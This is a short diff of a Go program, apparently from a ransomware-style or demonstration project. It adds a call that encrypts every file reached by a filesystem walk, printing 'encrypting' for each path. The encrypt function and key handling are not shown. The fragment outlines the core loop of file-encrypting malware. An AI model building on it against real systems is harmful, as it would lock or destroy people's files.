@@ -19,5 +19,7 @@ func main() {
 
 	common.Walk(startWalk, func(filePath string, fileInfo os.FileInfo) {
 		fmt.Println("encrypting", filePath)
+
+		encrypt(filePath, priv)
 	})
 }
